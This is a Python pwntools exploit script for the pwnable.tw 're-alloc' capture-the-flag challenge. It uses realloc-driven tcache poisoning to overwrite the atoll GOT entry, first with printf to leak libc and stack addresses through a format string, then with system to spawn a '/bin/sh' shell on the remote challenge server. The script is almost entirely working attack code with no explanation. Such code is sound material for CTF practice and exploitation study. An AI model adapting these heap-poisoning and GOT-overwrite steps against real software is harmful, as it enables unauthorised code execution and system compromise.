#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('re-alloc_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

        b*0x40129D    
        c
        ''')
        sleep(1)

# nc chall.pwnable.tw 10106
if args.REMOTE:
    p = remote('chall.pwnable.tw', 10106)
    

else:
    p = process([exe.path])

def add(idx , size, data = b'p'):
    sla(b'Your choice: ', b'1')
    sna(b'Index:', idx)
    sna(b'Size:', size)
    sa(b'Data:', data)

def re_allocf(idx, size = 0, data=b'evil'):
    sla(b'Your choice: ', b'2')
    sna(b'Index:', idx)
    sna(b'Size:', size)
    if size==0:
        return
    
    sa(b'Data:', data)
    

def freef(idx):
    sla(b'Your choice: ', b'3')
    sna(b'Index:', idx)
# # server
# while True:
#     a = input()
#     if 'q' in a:
#         break
#     sl(a.encode())
# add(1, 0x38, b'asas')
# freef(1)

# 1 tcache
add(0, 0x18, b'asas')
re_allocf(0, 0)
re_allocf(0, 0x18, p64(exe.got.atoll))
# re_allocf(0, 0)
add(1, 0x18)
re_allocf(0, 0x50, b'wdw')
freef(0)

re_allocf(1, 0x68, p64(exe.got.atoll))
freef(1)


# second tcache
add(0, 0x30)
re_allocf(0)
re_allocf(0, 0x30, p64(exe.got.atoll))
add(1, 0x30)

re_allocf(0, 0x50, b'as')
freef(0)

re_allocf(1, 0x70, b'assd')
freef(1)
# 
# freef(0)

# get poison at idx 0
add(0, 0x38, p64(exe.plt.printf))
sla(b'Your choice: ', b'3')

sa(b'Index:', b'%21$p ...%12$p')
libc_leak = int(p.recvuntil(b' ...', drop=True), 16)
libc.address = libc_leak-0x26b6b
stack_leak = int(r(0xe), 16)


info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

info(f'stack leak: {hex(stack_leak)}')
# one = 0x52c6b + libc.address
GDB()

sla(b'Your choice: ', b'1')

sa(b'Index:', b'1\0')

sa(b'Size:', b'a'*16)
# 

sa(b'Data:', p64(libc.sym.system))

sla(b'Your choice: ', b'1')
sa(b'Index:', b'/bin/sh\0')


# 0x404000
p.interactive()
